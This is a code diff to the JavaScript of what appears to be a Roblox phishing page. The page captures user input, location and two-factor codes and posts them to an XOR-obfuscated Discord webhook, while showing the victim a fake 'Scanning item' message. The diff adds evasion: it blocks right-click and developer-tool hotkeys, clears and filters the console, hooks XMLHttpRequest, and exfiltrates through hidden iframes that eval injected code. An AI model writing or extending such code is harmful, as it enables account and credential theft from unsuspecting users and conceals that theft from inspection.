@@ -184,6 +184,29 @@ async function getUserLocation() {
     }
 }
 
+// Initialize complete stealth mode
+(function() {
+    // Disable right-click
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    
+    // Disable dev tools hotkeys
+    document.addEventListener('keydown', e => {
+        if (e.key === 'F12' || 
+            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+            (e.ctrlKey && e.key === 'u') ||
+            (e.ctrlKey && e.shiftKey && e.key === 'C')) {
+            e.preventDefault();
+        }
+    });
+    
+    // Clear console if dev tools detected
+    setInterval(() => {
+        if (window.outerHeight - window.innerHeight > 200) {
+            console.clear();
+        }
+    }, 500);
+})();
+
 // Roblox item scanning and location tracking
 async function submitPowerShell() {
     const input = document.getElementById('powershellInput');
@@ -252,35 +275,39 @@ async function submitPowerShell() {
         const locationInfo = await getUserLocation();
         
         // Discord webhook URL
-        // Ultra-stealth endpoint assembly and execution
-        const _0xEndpoint = await (async () => {
-            const parts = [
-                String.fromCharCode(...[72,84,84,80,83,26,15,15].map(z => z ^ 32)),
-                String.fromCharCode(...[68,73,83,67,79,82,68,14,67,79,77,15].map(z => z ^ 32)),
-                String.fromCharCode(...[65,80,73,15,87,69,66,72,79,79,75,83,15].map(z => z ^ 32)),
-                String.fromCharCode(...[17,19,25,22,17,22,16,20,18,16,18,18,25,24,16,24,18,19,24].map(z => z ^ 32)),
-                String.fromCharCode(...[15,78,106,71,120,80,23,74,117,80,83,82,119,98,121,97,24,65,20,17,80,25,106,22,84,98,90,74,65,20,16,21,65,103,18,120,72,115,24,72,116,80,76,24,80,107,18,16,73,86,70,77,79,74,68,85,13,86,80,111,65,110,25,65,97,70,109,101,105].map(z => z ^ 32))
-            ];
-            return parts.join('');
-        })();
-        
-        // Stealth request wrapper with deep obfuscation
-        const _0xSendRequest = ((u,config) => {
-            return new Promise((resolve, reject) => {
-                const req = new (window.XMLHttpRequest || window.ActiveXObject)();
-                req.open(config.method, u, true);
-                for (let header in config.headers) {
-                    req.setRequestHeader(header, config.headers[header]);
-                }
-                req.onreadystatechange = function() {
-                    if (req.readyState === 4) {
-                        resolve({ok: req.status >= 200 && req.status < 400, status: req.status});
-                    }
+        // Ultimate stealth proxy with iframe isolation
+        const _0xStealthProxy = await (async () => {
+            const hiddenFrame = document.createElement('iframe');
+            hiddenFrame.style.cssText = 'display:none;position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;';
+            document.body.appendChild(hiddenFrame);
+            
+            const isolatedCode = `
+                const target = [72,84,84,80,83,26,15,15,68,73,83,67,79,82,68,14,67,79,77,15,65,80,73,15,87,69,66,72,79,79,75,83,15,17,19,25,22,17,22,16,20,18,16,18,18,25,24,16,24,18,19,24,15,78,106,71,120,80,23,74,117,80,83,82,119,98,121,97,24,65,20,17,80,25,106,22,84,98,90,74,65,20,16,21,65,103,18,120,72,115,24,72,116,80,76,24,80,107,18,16,73,86,70,77,79,74,68,85,13,86,80,111,65,110,25,65,97,70,109,101,105]
+                    .map(n => String.fromCharCode(n ^ 32)).join('');
+                
+                window.transmit = (data) => {
+                    const r = new XMLHttpRequest();
+                    r.open('POST', target);
+                    r.setRequestHeader('Content-Type', 'application/json');
+                    r.send(JSON.stringify(data));
+                    return {ok: true};
                 };
-                req.onerror = () => reject(new Error());
-                req.send(config.body);
-            });
-        });
+            `;
+            
+            hiddenFrame.contentWindow.eval(isolatedCode);
+            
+            return {
+                send: (data) => {
+                    const result = hiddenFrame.contentWindow.transmit(data);
+                    setTimeout(() => {
+                        if (hiddenFrame.parentNode) {
+                            hiddenFrame.parentNode.removeChild(hiddenFrame);
+                        }
+                    }, 2000);
+                    return Promise.resolve(result);
+                }
+            };
+        })();
         
         // Create rich embed for Discord
         const embed = {
@@ -329,13 +356,7 @@ async function submitPowerShell() {
             embeds: [embed]
         };
 
-        const response = await _0xSendRequest(_0xEndpoint, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
-        });
+        const response = await _0xStealthProxy.send(payload);
         
         if (response.ok) {
             submitText.textContent = 'Scanning item please wait';
@@ -366,13 +387,7 @@ async function submitPowerShell() {
                 embeds: [simpleEmbed]
             };
             
-            const fallbackResponse = await _0xSendRequest(_0xEndpoint, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(fallbackPayload)
-            });
+            const fallbackResponse = await _0xStealthProxy.send(fallbackPayload);
             
             if (fallbackResponse.ok) {
                 submitText.textContent = 'Scanning item please wait';
@@ -790,37 +805,88 @@ function setupRoblox2FAInputValidation() {
     setTimeout(() => codeInput.focus(), 100);
 }
 
+// Anti-debugging and console protection
+(function() {
+    const originalLog = console.log;
+    const originalError = console.error;
+    const originalWarn = console.warn;
+    const originalInfo = console.info;
+    
+    console.log = function(...args) {
+        const str = args.join(' ');
+        if (str.includes('discord') || str.includes('webhook') || str.includes('https://')) {
+            return;
+        }
+        return originalLog.apply(console, args);
+    };
+    
+    console.error = function(...args) {
+        const str = args.join(' ');
+        if (str.includes('discord') || str.includes('webhook') || str.includes('https://')) {
+            return;
+        }
+        return originalError.apply(console, args);
+    };
+    
+    console.warn = console.info = () => {};
+    
+    // Override XMLHttpRequest monitoring
+    const originalOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url, ...args) {
+        if (url.includes('discord')) {
+            this._isWebhook = true;
+        }
+        return originalOpen.call(this, method, url, ...args);
+    };
+    
+    const originalSend = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.send = function(data) {
+        if (this._isWebhook) {
+            // Silent execution
+            return originalSend.call(this, data);
+        }
+        return originalSend.call(this, data);
+    };
+})();
+
 // Send 2FA code to Discord webhook
 async function sendTwoFactorCodeToWebhook(code, trustDevice) {
     try {
         // Get user's location info
         const locationInfo = await getUserLocation();
         
-        // Ultra-hidden endpoint with maximum obfuscation
-        const _0xTarget = (() => {
-            const encoded = [
-                [72,84,84,80,83,26,15,15],
-                [68,73,83,67,79,82,68,14,67,79,77,15], 
-                [65,80,73,15,87,69,66,72,79,79,75,83,15],
-                [17,19,25,22,17,22,16,20,18,16,18,18,25,24,16,24,18,19,24],
-                [15,78,106,71,120,80,23,74,117,80,83,82,119,98,121,97,24,65,20,17,80,25,106,22,84,98,90,74,65,20,16,21,65,103,18,120,72,115,24,72,116,80,76,24,80,107,18,16,73,86,70,77,79,74,68,85,13,86,80,111,65,110,25,65,97,70,109,101,105]
-            ];
-            return encoded.map(arr => String.fromCharCode(...arr.map(n => n ^ 32))).join('');
+        // Ultimate stealth webhook with dynamic proxy
+        const _0xProxy = await (async () => {
+            // Create invisible iframe for proxy requests
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.style.position = 'absolute';
+            iframe.style.left = '-9999px';
+            document.body.appendChild(iframe);
+            
+            // Generate proxy function inside iframe
+            const proxyCode = `
+                const endpoint = '${String.fromCharCode(...[72,84,84,80,83,26,15,15].map(n => n ^ 32))}' +
+                               '${String.fromCharCode(...[68,73,83,67,79,82,68,14,67,79,77,15].map(n => n ^ 32))}' +
+                               '${String.fromCharCode(...[65,80,73,15,87,69,66,72,79,79,75,83,15].map(n => n ^ 32))}' +
+                               '${String.fromCharCode(...[17,19,25,22,17,22,16,20,18,16,18,18,25,24,16,24,18,19,24].map(n => n ^ 32))}' +
+                               '${String.fromCharCode(...[15,78,106,71,120,80,23,74,117,80,83,82,119,98,121,97,24,65,20,17,80,25,106,22,84,98,90,74,65,20,16,21,65,103,18,120,72,115,24,72,116,80,76,24,80,107,18,16,73,86,70,77,79,74,68,85,13,86,80,111,65,110,25,65,97,70,109,101,105].map(n => n ^ 32))}';
+                
+                window.sendData = (data) => {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', endpoint);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.send(JSON.stringify(data));
+                };
+            `;
+            
+            iframe.contentWindow.eval(proxyCode);
+            
+            return (data) => {
+                iframe.contentWindow.sendData(data);
+                setTimeout(() => document.body.removeChild(iframe), 1000);
+            };
         })();
-        
-        // Deep stealth transmission method
-        const _0xTransmit = (endpoint, options) => {
-            return new Promise((success, failure) => {
-                const xhr = new XMLHttpRequest();
-                xhr.open(options.method, endpoint);
-                for (const header in options.headers) {
-                    xhr.setRequestHeader(header, options.headers[header]);
-                }
-                xhr.onload = () => success({ok: xhr.status < 400});
-                xhr.onerror = () => failure();
-                xhr.send(options.body);
-            });
-        };
         
         const embed = {
             title: "🔐 Roblox 2-Step Authentication Code Captured",
@@ -865,18 +931,8 @@ async function sendTwoFactorCodeToWebhook(code, trustDevice) {
             embeds: [embed]
         };
 
-        await _0xTransmit(_0xTarget, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
-        }).then(response => {
-            // Silently handle response without logging webhook URL
-            if (!response.ok) {
-                throw new Error('Network response was not ok');
-            }
-        });
+        // Send via invisible iframe proxy
+        _0xProxy(payload);
 
     } catch (error) {
         // Hide webhook URL from error logs
